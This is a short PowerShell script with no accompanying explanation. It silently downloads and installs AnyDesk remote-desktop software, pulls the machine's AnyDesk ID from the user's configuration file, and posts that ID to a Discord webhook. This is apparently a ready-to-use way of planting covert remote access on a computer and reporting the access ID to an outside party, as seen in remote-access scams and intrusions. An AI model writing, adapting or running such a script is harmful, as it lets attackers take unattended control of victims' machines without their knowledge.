# Set variables for the download and installation
$anydeskUrl = "https://download.anydesk.com/AnyDesk.exe"
$anydeskInstallerPath = "$env:TEMP\AnyDesk.exe"
$discordWebhookUrl = "<web_hook>"

# Download AnyDesk
Invoke-WebRequest -Uri $anydeskUrl -OutFile $anydeskInstallerPath

# Install AnyDesk silently
Start-Process $anydeskInstallerPath -ArgumentList '/S' -Wait

# Give AnyDesk some time to finish installation
Start-Sleep -Seconds 10

# Retrieve AnyDesk ID from the configuration file
$anydeskConfigPath = "$env:APPDATA\AnyDesk\system.conf"
if (Test-Path $anydeskConfigPath) {
    $anydeskID = (Get-Content $anydeskConfigPath | Select-String -Pattern "ad.anynet.id=" | ForEach-Object { $_ -replace "ad.anynet.id=", "" })
} else {
    $anydeskID = "AnyDesk ID not found."
}

# Prepare the message to send to Discord
$discordMessage = @{
    content = "AnyDesk ID: $anydeskID"
} | ConvertTo-Json

# Send the AnyDesk ID to Discord
Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -Body $discordMessage -ContentType 'application/json'
